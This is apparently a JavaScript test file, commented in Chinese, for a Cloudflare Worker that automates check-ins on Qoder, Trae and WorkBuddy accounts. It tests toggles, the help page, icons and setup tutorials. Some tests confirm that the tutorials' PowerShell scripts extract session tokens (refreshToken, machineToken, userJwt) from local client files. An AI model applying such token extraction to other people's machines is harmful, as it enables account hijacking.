  assert.doesNotMatch(home.text, /1 个账号需要处理/, "停用中不该亮红条");
  assert.match(home.text, /1 个账号（停用中，恢复后仍要处理）/, "停用中仍要如实显示待处理数量");
  // 进度与最后结果照常显示：用户要的是"我知道它不动，但我也知道它停在哪"
  assert.match(home.text, /今日完成/, "停用中也要显示今日进度");
  assert.ok(home.text.includes("/tool/fix/toggle"), "卡片上要有开关");

  const page = await authed("/tool/fix", env);
  assert.ok(!page.text.includes(">执行<"), `停用中不该显示「执行」：${page.text.match(/<button[^>]*>[^<]*/g)?.join(" | ")}`);
  assert.ok(page.text.includes(">测试<"), "停用中要保留「测试」");
  assert.match(page.text, /已停用/, "工具页要说明停用语义");
  assert.doesNotMatch(page.text, /个账号需要你处理/, "停用中工具页也不该亮红条");
  assert.match(page.text, /有 1 个账号处于失败或需重新登录状态/, "停用中要如实说明还有几个待处理");
});

fixtureTest("[开关切换是 POST：成功回执跳回总览，不许 GET 改状态", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  await createAccount(env, kv);
  assert.equal((await authed("/tool/fix/toggle", env)).status, 404, "GET 不该改状态");

  const off = await hit("/tool/fix/toggle", { method: "POST", body: form({ pwd: PASSWORD }), env });
  assert.equal(off.status, 303);
  assert.ok(off.headers.get("location").includes("/?"), `该跳回总览，实际 ${off.headers.get("location")}`);
  assert.deepEqual(JSON.parse(kv.store.get("v1:flags")).fix.off, true);
  const home = await hit(off.headers.get("location"), { env });
  assert.match(home.text, /已停用/, "回执要说清楚");

  const on = await hit("/tool/fix/toggle", { method: "POST", body: form({ pwd: PASSWORD }), env });
  assert.equal(JSON.parse(kv.store.get("v1:flags")).fix.off, false);
  const back = await hit(on.headers.get("location"), { env });
  assert.match(back.text, /已恢复/, "恢复也要有回执");
  assert.doesNotMatch(back.text, /class="card dim"/, "恢复后卡片不该还暗着");
});

test("[不做「全部停用」总开关：停用标记只影响该工具自己", async () => {
  // 用户明确拒绝过"全部停用"。这条把它钉住：任何一个工具的 off 都不许波及其它工具。
  const kv = fakeKv();
  const tools = ["fix", "t2", "t3"].map((id) => syntheticTool(id));
  tools.forEach((t, i) => seedFor(kv, t.id, `SEAT${i}1`));
  offFlags(kv, ["t2"]);
  const { summary } = await tickWith(kv, tools, 45, cst(10));
  const skipped = summary.plan.filter((p) => p.skipped).map((p) => p.tool);
  assert.deepEqual(skipped, ["t2"], `只有 t2 该被跳过，实际 ${JSON.stringify(skipped)}`);
  assert.equal(planOf(summary, "fix").accounts.length, 1, "fix 该照常跑");
  assert.equal(planOf(summary, "t3").accounts.length, 1, "t3 该照常跑");
  // 存储形状：单键存全部工具，不是每工具一个键（那会让读一次变成 N 次 get）
  assert.deepEqual(Object.keys(JSON.parse(kv.store.get("v1:flags"))), ["t2"]);
});

fixtureTest("[/api/state 报出停用状态，说明页写清开关语义", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  await createAccount(env, kv);
  offFlags(kv, ["fix"]);

  const state = JSON.parse((await authed("/api/state", env)).text);
  assert.equal(state.stage, 5);
  const off = state.tools.find((t) => t.id === "fix");
  assert.equal(off.off, true, "api/state 要能看出这个工具停着，否则外部看板看不出开关状态");
  assert.equal(state.tools.find((t) => t.id === "qoder").off, false, "没标记的默认是开启，不许因为读不到就当成停用");

  const help = await authed("/help", env);
  assert.match(help.text, /没有/, "说明页要提到这件事");
  assert.match(help.text, /全部停用/, "说明页要写明没有「全部停用」总开关，免得用户去找");
  assert.match(help.text, /一条都不删/, "说明页要写清停用不删数据 —— 这是最该被知道的一条");
});

test("[说明页不许出现开发进度", async () => {
  // /help 是使用者看的操作说明。「阶段 N · 已完成 / 待做」这类内部工程进度
  // 对使用者无用，而且没有任何机制会更新它 —— 只会过期成永久的谎言。
  const res = await authed("/help", envFor(fakeKv()));
  for (const leak of ["阶段进度", "阶段 1", "已完成 —", "待做 —", "接三家", "会管"]) {
    assert.ok(!res.text.includes(leak), `说明页漏出了开发进度「${leak}」`);
  }
  // 删掉进度表不能连带删掉真内容：状态词表与工具清单必须还在
  assert.match(res.text, /状态词汇表/, "状态词表是长期有效的操作信息，不该跟着进度表一起没掉");
  assert.match(res.text, /已注册的工具/);
});

test("页面底部有版本号与 GitHub 链接", async () => {
  const res = await authed("/", envFor(fakeKv()));
  // 版本号 yyyy-MM-dd:NN 由 tools/bump-version.mjs 在部署前写入，footer 全站共用
  assert.match(res.text, /class="ft">\d{4}-\d{2}-\d{2}:\d{2}</, "版本号缺失或格式不对");
  assert.ok(res.text.includes('href="https://github.com/chevy222/app-cf-checkin"'), "GitHub 链接缺失");
  assert.ok(res.text.includes("Powered by GitHub"));
});

test("版本号递增：当天 +1，跨天回 01", () => {
  assert.equal(nextVersion("2026-10-01:01", "2026-10-01"), "2026-10-01:02");
  assert.equal(nextVersion("2026-10-01:09", "2026-10-01"), "2026-10-01:10");
  assert.equal(nextVersion("2026-09-30:07", "2026-10-01"), "2026-10-01:01");
});

test("[注册表里只有三家真实工具，夹具不许留在里面", async () => {
  // 夹具一旦留在注册表里就会产生真实副作用：占导航一格、被 cron 每 30 分钟调度一次、
  // 往 /runs 写假记录。演示工具不该有这些。所以它只在测试里临时注入。
  assert.deepEqual(TOOLS.map((t) => t.id), ["qoder", "trae", "workbuddy"],
    `注册表不该含夹具或多出别的东西：${TOOLS.map((t) => t.id).join(", ")}`);
  assert.equal(TOOLS.includes(FIXTURE), false, "夹具被留在注册表里了");

  // 反过来也要成立：夹具必须仍然覆盖内核里只有它能走到的分支，否则
  // creds 里的 select 与 config 里的 select 会变成无人验证的活代码，
  // 而它们是「加第 N 个工具」契约的一半。
  assert.equal(typeof FIXTURE.uidOf, "function", "夹具必须声明 uidOf");
  assert.ok(FIXTURE.creds.some((f) => f.type === "select"), "夹具必须有一个 select 凭据");
  assert.ok(FIXTURE.config.some((f) => f.type === "select" && f.required), "夹具必须有一个必填的 select 配置项");
  // 且它真的能走通路由（注入 → 请求 → 落 KV → 摘掉）
  const kv = fakeKv(); const env = envFor(kv);
  const inside = await withFixtureTool(async () => {
    const res = await hit("/account/fix/new", {
      method: "POST", env, body: form({ pwd: PASSWORD, label: "夹具号", session: SECRET_VALUE, plan: "pro", seatId: "SEAT0001" }),
    });
    return { status: res.status, stored: kv.store.has("v1:acct:fix:SEAT0001") };
  });
  assert.equal(inside.status, 303, "注入期间路由该认得夹具");
  assert.equal(inside.stored, true, "uidOf 该把凭据算出的标识当 uid 存下来");
  assert.equal(TOOLS.includes(FIXTURE), false, "withFixtureTool 跑完必须把夹具摘掉，否则会漏给后面的测试");
  assert.equal((await authed("/tool/fix", env)).status, 404, "摘掉之后路由不该再认得它");
});

test("[uidField 已彻底删除：契约里只剩 uidOf 一个来源", async () => {
  // uidField 不是一种能力，是 uidOf 的语法糖（uidField: "x" ≡ uidOf: c => c.values.x）。
  // 留着它等于在契约里多放一个"必须和 uidOf 保持行为一致"的分支，而没有任何机制
  // 能保证这一点。三家在用的都是 uidOf，没有任何工具的身份是表单上的明面字段。
  const { readFileSync } = await import("node:fs");
  const files = [
    "src/core/router.js", "src/core/accounts.js", "src/ui/pages/tool.js",
    "src/tools/index.js", "src/ui/forms.js", "src/core/scheduler.js", "src/core/runner.js",
  ];
  for (const file of files) {
    const text = readFileSync(file, "utf8");
    // 只看代码：注释里提到 uidField 是解释为什么删的，属于这个项目最有价值的知识
    const code = text.split("\n").filter((line) => !line.trim().startsWith("//")).join("\n");
    assert.ok(!code.includes("uidField"), `${file} 的代码里还有 uidField`);
  }
  // 注册表自检现在只认 uidOf
  assert.deepEqual(TOOLS.map((t) => typeof t.uidOf), ["function", "function", "function"],
    "三家工具都必须声明 uidOf");
  // 少声明 uidOf 要在**模块加载时**就报错（部署时直接失败，而不是第一次建号才炸）。
  // 断言自检里那条判定确实在，别让它被改松。
  const entry = readFileSync("src/tools/index.js", "utf8");
  assert.match(entry, /if \(!tool\.uidOf\) bad\(/, "自检必须有一条「缺 uidOf 就报错」的判定");
  assert.ok(!/uidField/.test(entry.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n")),
    "注册表自检里不该再有 uidField");
  // 表单文案只有一种形态了
  const form = readFileSync("src/ui/pages/tool.js", "utf8");
  assert.match(form, /保存时从凭据里自动解出，不用另外填/);
  assert.doesNotMatch(form, /自动得出/, "uidField 那句文案该随之消失");
});

test("[图标内联在 data URI 里，且必须是 PNG", async () => {
  // 图标走内联而不是 public/ + Static Assets：public/ 下的文件由 Cloudflare
  // 直接伺服、绕过 Worker，也就绕过了 ?pwd= 那道闸。内联让图标和其它界面一样在闸后。
  // 这条断言守的是那个决定 —— 哪天有人改成外链，图标就变成无口令可拿的资源了。
  for (const [id, uri] of Object.entries(ICONS)) {
    assert.ok(uri.startsWith("data:image/png;base64,"), `${id} 必须是内联的 PNG data URI`);
    const b64 = uri.slice("data:image/png;base64,".length);
    // PNG 头 8 字节签名 + 4 长度 + 4 类型"IHDR" = 16，宽高在其后 8 字节 → 前 24 字节。
    // 注意 base64 是 4 字符出 3 字节：要拿满 24 字节得切 32 个字符（切 24 字符只有 18 字节）。
    const head = Buffer.from(b64.slice(0, 32), "base64");
    assert.equal(head.length, 24, `base64 头部不够长：${head.length} 字节`);
    assert.deepEqual([...head.slice(0, 8)], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a],
      `${id} 的 PNG 签名不对，说明 base64 被截断或串了`);
    assert.equal(head.readUInt32BE(16), 64, `${id} 宽度该是 64`);
    assert.equal(head.readUInt32BE(20), 64, `${id} 高度该是 64`);
  }

  // 三家都要有图标，且体积不许爆炸 —— 图标是**每个页面**都要付的，
  // 256×256 的原图会让每页胖 50 KB（qoder 那张 base64 实测就有 50 KB）。
  for (const tool of TOOLS) {
    assert.ok(ICONS[tool.id], `${tool.name} 没有图标`);
    assert.ok(ICONS[tool.id].length < 8000, `${tool.name} 的图标 base64 有 ${ICONS[tool.id].length} 字符，太大了`);
  }
  const total = Object.values(ICONS).reduce((s, x) => s + x.length, 0);
  assert.ok(total < 20000, `三个图标合计 ${total} 字符，超出预算`);

  // 没登记图标的工具回落到空串而不是破图（图标是可选字段，加新工具不必急着配图）
  assert.equal(iconImg({ id: "nope" }), "");

  // 真的渲染出来了：首页卡片与工具页都要有 <img>
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  const home = await authed("/", env);
  for (const tool of TOOLS) {
    assert.ok(home.text.includes(ICONS[tool.id]), `${tool.name} 的图标没渲染到首页`);
  }
  assert.match(home.text, /<img class="ico" src="data:image\/png;base64,/, "首页该有图标的 img 标签");
  const help = await authed("/help", env);
  assert.ok(help.text.includes('class="ico"'), "说明页的工具清单也该带图标");
  const page = await authed("/tool/qoder", env);
  assert.ok(page.text.includes('class="ico"'), "工具页该带图标");
});

// 2026-10-01 用户拿说明页截图反馈：工具名（Qoder / Trae / WorkBuddy）压在图标下面。
// 根因是 .kv .k 不是 flex 容器，而 .ico 是 display:block（那样它不占基线下的空隙），
// 于是图标成块级元素竖在文字上方。设计稿 ui-preview.html 里那一行本来就是横向的。
test("说明页工具清单里图标排在名字左边（.kv .k 带图标时显式 flex）", async () => {
  const env = envFor(fakeKv());
  const page = await authed("/help", env);
  const css = page.text.match(/<style>([\s\S]*?)<\/style>/)[1];

  assert.match(css, /\.kv \.k:has\(\.ico\)\{[^}]*display:flex/,
    "带图标的 .kv .k 没有显式 flex，图标会竖在名字上方");
  assert.match(css, /\.kv \.k:has\(\.ico\)\{[^}]*align-items:center/,
    "图标与名字没有垂直居中对齐");
  // 只在带图标时套 flex：状态词汇表那一列 .k 里是徽章，不能被这条规则影响排版
  assert.match(css, /\.kv \.k:has\(\.ico\)\{[^}]*\}\s*\.field\{/, "这条规则必须只作用于带图标的 .k");

  // 结构上：图标与名字必须同在一个 .k 里，否则 flex 也救不了
  assert.match(page.text, /<span class="k"><img class="ico"[^>]*>(Qoder|Trae|WorkBuddy)<\/span>/,
    "说明页的工具名与图标不在同一个 .k 里");
});

test("[三家的参数获取教程在「新增账号」页上，且步骤完整", async () => {
  // 教程内容挪自三个旧 Worker 的 README（客户端取值那一套），不是 F12 抓包。
  // 这条守三件事：三家都有教程、步骤带序号、PowerShell 代码块完整。
  const env = envFor(fakeKv());
  for (const tool of TOOLS) {
    const page = await authed(`/account/new?tool=${tool.id}`, env);
    assert.equal(page.status, 200, `${tool.name} 的新增页打不开`);
    assert.match(page.text, /class="tutbox"/, `${tool.name} 的新增页没有教程块`);
    // 步骤序号从 1 连续排下去
    const nums = [...page.text.matchAll(/class="tut-n">(\d+)</g)].map((m) => Number(m[1]));
    assert.ok(nums.length >= 3, `${tool.name} 的教程只有 ${nums.length} 步，太少：${JSON.stringify(nums)}`);
    assert.deepEqual(nums, nums.map((_, i) => i + 1), `${tool.name} 的步骤序号不连续：${JSON.stringify(nums)}`);
    // 代码块数量按各家设计走：Qoder 是"一整段复制粘贴"（1 块），
    // Trae 分散在取设备号 / 开登录页 / 解析回调（3 块），WorkBuddy 两步两块。
    // 所以断的是"代码块非空"，不是块数 —— 硬要求 >= 2 会把 Qoder 那种正确形态判红。
    const blocks = [...page.text.matchAll(/<pre class="tut-c">([\s\S]*?)<\/pre>/g)].map((m) => m[1]);
    assert.ok(blocks.length >= 1, `${tool.name} 的教程没有代码块`);
    const total = blocks.reduce((sum, b) => sum + b.trim().length, 0);
    assert.ok(total > 200, `${tool.name} 的教程代码块加起来只有 ${total} 字符，太少了`);
    // 最大的一块要够长 —— 一段能抳出凭据的脚本不会只有几行
    assert.ok(Math.max(...blocks.map((b) => b.length)) > 300,
      `${tool.name} 最长的一段脚本只有 ${Math.max(...blocks.map((b) => b.length))} 字符，抳不出东西的教程比没有更坏`);
  }
});

// 有 default 的字段（Trae 的 ClientID / 客户端版本、Qoder 的 Cosy-ClientType）
// 界面上标着必填却给一个空框：用户会以为漏填了，去别处抄一个可能已过期的版本号。
// 契约是"留空即用默认值" —— 服务端回落 + 界面预填，两边都要在。
test("[有默认值的字段：界面预填且留空提交不报错]", async () => {
  const withDefault = [];
  for (const tool of TOOLS) {
    for (const f of [...tool.config || [], ...tool.creds]) {
      if (f.default !== undefined) withDefault.push({ tool, field: f });
    }
  }
  assert.ok(withDefault.length >= 3, `期望至少三处声明了 default，实际 ${withDefault.length}`);

  const env = envFor(fakeKv());
  for (const { tool, field } of withDefault) {
    const page = await authed(`/tool/${tool.id}/settings`, env);
    assert.equal(page.status, 200, `${tool.name} 的配置页打不开`);
    // 预填：输入框的 value 要等于默认值
    const input = page.text.match(new RegExp(`id="f-${field.key}"[^>]*value="([^"]*)"`))
      || page.text.match(new RegExp(`value="([^"]*)"[^>]*id="f-${field.key}"`));
    assert.ok(input, `${tool.name} 的「${field.label}」没有渲染成输入框`);
    assert.equal(input[1], String(field.default),
      `${tool.name} 的「${field.label}」没预填默认值（框里是空的，用户会以为要自己填）`);
    // help 要说清"通常不用动"，否则预填了用户也不敢确定
    assert.match(page.text, /已预填|不用动/, `${tool.name} 的「${field.label}」没说清可以不动`);
  }

  // 留空提交：走服务端校验，不该报必填
  for (const { tool, field } of withDefault) {
    const fields = [...tool.config || [], ...tool.creds];
    const form = { get: (k) => (k === field.key ? "" : "x-some-secret-value") };
    const { values, errors } = coerceFields(fields, form, { editing: true });
    assert.equal(errors[field.key], undefined, `「${field.label}」留空却被报必填：${errors[field.key] || ""}`);
    assert.equal(String(values[field.key]), String(field.default), `留空后没有回落到默认值`);
  }
});

// 表格第一列写的是「平台内部的头名」（x-device-id / COSY_* / Authorization: Bearer），
// 而表单里那一栏叫「Aha 设备号」「Cosy-ClientType」「Access Token」。
// 用户按头名去找字段找不到，会以为少填了一项 —— 教程与表单对不上，比没有教程更容易让人误操作。
test("[教程的字段表用表单里能看到的名字，不用平台内部的头名", () => {
  // 字段名可能来自 creds（账号表单）或 config（工具配置，两处合起来才是用户要填的栏位）
  for (const tool of TOOLS) {
    const t = TUTORIALS[tool.id];
    if (!t || !t.fields) continue;
    const fieldNames = [...tool.creds, ...(tool.config || [])].map((f) => f.label);
    const bad = [];
    for (const [col] of t.fields) {
      // 去掉 markdown 记号后，要么就是某个栏位名，要么明确标成"不用填"
      const clean = col.replace(/\*\*/g, "").replace(/`/g, "").trim();
      if (clean.startsWith("（不用填）")) continue;
      if (!fieldNames.includes(clean)) bad.push(clean);
    }
    assert.deepEqual(bad, [], `${tool.name} 教程表格里这些名字在表单里找不到：${bad.join("、")}（表单只有：${fieldNames.join("、")}）`);
  }
});

test("[教程里 PowerShell 脚本能真的抳出对应的凭据字段", async () => {
  // 这是本条最关键的地方：教程里的脚本是**真的会被人复制去跑**的，
  // 抳不出东西的教程比没有教程更坏（人会以为是自己弄错了）。
  // 所以这里不只检查"有代码块"，而是检查每段脚本里出现了本工具真实要用的那个值。
  const expect = {
    qoder: [/runtime-info\.exe/, /auth\.v1\.dat/, /machineToken/, /refreshToken/],
    trae: [/iCubeAuthInfo/, /icube-dc/, /userJwt/, /refreshToken/, /UnescapeDataString/],
    workbuddy: [/send-sms/, /login\/token/, /sms_code/, /accessToken/, /refreshToken/],
  };
  for (const [id, patterns] of Object.entries(expect)) {
    const t = TUTORIALS[id];
    assert.ok(t, `${id} 没有教程`);
    const body = JSON.stringify(t.steps);
    for (const re of patterns) {
      assert.match(body, re, `${id} 的教程里找不到 ${re} —— 脚本抳不出这个值`);
    }
  }
});

test("[Trae 教程的解析脚本与服务端 parseCallbackUrl 同语义", async () => {
  // 服务端（trae-cf-checkin/worker.js 的 parseCallbackUrl）与教程里的 PowerShell
  // 必须解出**同一个** refreshToken。两边不一致 = 用户按教程拿到的是错的串。
  // 那个坑很具体：searchParams.get() 会把字面量 '+' 解成空格，
  // 令牌里含 '+' 就会被悄悄破坏 —— 所以两边都只用一次 %XX 解码。
  const cb = "http://127.0.0.1:18080/authorize?userJwt=%7B%22Token%22%3A%22JWT.VALUE%22%2C%22RefreshToken%22%3A%22RT%2BPLUS%22%7D&userInfo=%7B%22UserID%22%3A123456%7D";
  const raw = cb.slice(cb.indexOf("?") + 1);
  // 复刻教程里 Q 函数的语义：正则取值 + 一次 UnescapeDataString
  const q = (name) => {
    const m = raw.match(new RegExp(`(?:^|&)${name}=([^&]*)`));
    return m ? decodeURIComponent(m[1]) : "";
  };
  const jwt = JSON.parse(q("userJwt"));
  assert.equal(jwt.Token, "JWT.VALUE");
  assert.equal(jwt.RefreshToken, "RT+PLUS", "令牌里的 '+' 被解成了空格 —— 上游给的就是带加号的串");
  assert.equal(JSON.parse(q("userInfo")).UserID, 123456);
  // 教程里 Q 函数的正则必须真的能匹配上（少一个转义就会静默返回空串）
  assert.match(raw, /(?:^|&)userJwt=([^&]*)/);
  assert.match(raw, /(?:^|&)userInfo=([^&]*)/);
});

test("[Trae 教程里那行正则本身能匹配（抠出发布文本实测，非重抄）", () => {
  // 上一条是在测试里**重抄**一份服务端语义；这条反过来：把教程源码里真正发给用户的那行
  // 正则抠出来编译成 JS RegExp 跑一遍。抄一份的测法有个盲区——教程里的正则
  // 被人改坏了（少了转义、$ 拼错、锚点写错），重抄的那份照样通过。
  // 教程是**会被真人复制去跑**的东西，抳不出值比没有教程更坏，所以必须咬住发布文本。
  const code = TUTORIALS.trae.steps[3].code;
  const line = code.split("\n").find((l) => l.includes("[regex]::Match($raw"));
  assert.ok(line, "Trae 教程第 4 步里找不到 Q 函数的正则那一行");
  // 抠出模式串：那一行里恰好有一对引号（单引号或双引号都行），内容就是要编译的正则
  const lit = line.match(/["']([^"']*)["']/);
  assert.ok(lit, `无法从教程那一行抠出正则字面量：${line.trim()}`);
  // (?:^|&)$n= 里的 $n 是 PowerShell 变量插值，编译前替成真实参数名
  const src = lit[1].replace("$n", "userJwt");
  assert.ok(src.startsWith("(?:^|&)"), `抠出来的不是那条正则：${src}`);
  const re = new RegExp(src);

  // 真实回调串：userJwt 后面还跟着别的参数，锚点写错就会只匹配到第一个
  const raw = "userInfo=%7B%22UserID%22%3A123456%7D&userJwt=%7B%22Token%22%3A%22JWT.VALUE%22%7D&refreshToken=RT.PLAIN";
  const m = re.exec(raw);
  assert.ok(m, `教程的正则 ${src} 匹配不上真实回调串`);
  assert.equal(decodeURIComponent(m[1]), '{"Token":"JWT.VALUE"}');
  // '+' 不能被解成空格：令牌里含加号时会被悄悄破坏（服务端 rawParam 同此）
  const plus = "userJwt=AAA%2BBB";
  assert.equal(decodeURIComponent(re.exec(plus)[1]), "AAA+BB");
});

test("[教程块不引入脚本，也不含访问口令以外的敏感内容", async () => {
  const env = envFor(fakeKv());
  await createAccount(env, envFor(fakeKv()));
  for (const tool of TOOLS) {
    const page = await authed(`/account/new?tool=${tool.id}`, env);
    // 整站零 JS 的约定不能被教程破掉
    const box = page.text.slice(page.text.indexOf('class="tutbox"'));
    assert.ok(!/<script[\s>]/i.test(box), `${tool.name} 的教程里混进了 <script>`);
    assert.ok(!/\son\w+\s*=/i.test(box), `${tool.name} 的教程里混进了内联事件属性`);
    // 教程里不该出现任何形似真实凭据的长串
    assert.ok(!box.includes(SECRET_VALUE), `${tool.name} 的教程里混进了凭据`);
  }
  // 口令只允许出现在 HTML **属性**里（href / value），绝不出现在可见文本 ——
  // 这是全站约定（见项目规范），教程也不例外。断言要按"剥掉标签与属性值之后
  // 还剩不剩得到口令"来判，而不是简单地"页面里有没有这个串"：
  // 每个链接都带 ?pwd= 是设计如此。
  const page = await authed("/account/new?tool=qoder", env);
  const visible = page.text
    .replace(/<[^>]+>/g, " ")            // 去掉整个标签（含属性值）
    .replace(/&[a-z]+;/g, " ");          // 实体也算标签外
  assert.ok(!visible.includes(PASSWORD),
    `口令出现在了可见文本里：${visible.slice(Math.max(0, visible.indexOf(PASSWORD) - 60), visible.indexOf(PASSWORD) + 40)}`);
  // 但它必须在链接与 hidden input 里 —— 否则点一次链接就 401
  assert.ok(page.text.includes(`?pwd=${encodeURIComponent(PASSWORD)}`), "导航链接该带口令");
  assert.ok(page.text.includes(`name="pwd" value="${PASSWORD}"`), "表单该带隐藏的口令字段");
});

test("[工具配置页也带教程（Qoder 的设备标识在 config 里）", async () => {
  // Qoder 的 Cosy-* 是工具级配置、不在账号表单上，所以教程必须同时出现在配置页 ——
  // 否则用户照着新增页的教程做，会找不到地方填那 8 个值。
  const env = envFor(fakeKv());
  for (const tool of TOOLS) {
    const page = await authed(`/tool/${tool.id}/settings`, env);
    assert.equal(page.status, 200, `${tool.name} 的配置页打不开`);
    const has = /class="tutbox"/.test(page.text);
    assert.equal(has, Boolean(TUTORIALS[tool.id]), `${tool.name} 配置页的教程有无与数据不符`);
  }
});

test("[没有教程的工具不渲染空壳", async () => {
  // 夹具没有教程。渲染出一个空盒子就是"界面层不认识具体工具"被破掉的形态：
  // 界面该由"有没有数据"决定，而不是由"是不是第几个工具"决定。
  assert.equal(renderTutorial({ id: "nope" }), "");
  assert.equal(renderTutorial(FIXTURE), "");
});
